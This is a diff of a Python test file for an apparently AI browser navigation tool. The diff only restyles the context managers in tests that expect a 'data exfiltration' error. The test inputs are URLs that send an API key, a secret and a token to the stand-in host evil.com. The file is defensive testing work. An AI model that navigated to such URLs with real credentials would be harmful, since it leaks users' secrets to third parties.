@@ -21,10 +21,13 @@ def _make_session() -> MagicMock:
 @pytest.mark.asyncio
 async def test_exfiltration_detected_raises_tool_error() -> None:
     tool = create_navigate_tool(_make_session())
-    with patch(
-        _EXFIL_PATH,
-        return_value=["API key detected in URL query parameter"],
-    ), pytest.raises(ToolError, match="data exfiltration"):
+    with (
+        patch(
+            _EXFIL_PATH,
+            return_value=["API key detected in URL query parameter"],
+        ),
+        pytest.raises(ToolError, match="data exfiltration"),
+    ):
         await tool.ainvoke({"url": "https://evil.com/?key=sk-abc123"})
 
 
@@ -40,8 +43,11 @@ async def test_no_exfiltration_passes() -> None:
 @pytest.mark.asyncio
 async def test_exfiltration_multiple_warnings() -> None:
     tool = create_navigate_tool(_make_session())
-    with patch(
-        _EXFIL_PATH,
-        return_value=["Warning A", "Warning B"],
-    ), pytest.raises(ToolError, match=r"Warning A.*Warning B"):
+    with (
+        patch(
+            _EXFIL_PATH,
+            return_value=["Warning A", "Warning B"],
+        ),
+        pytest.raises(ToolError, match=r"Warning A.*Warning B"),
+    ):
         await tool.ainvoke({"url": "https://evil.com/?a=secret&b=token"})
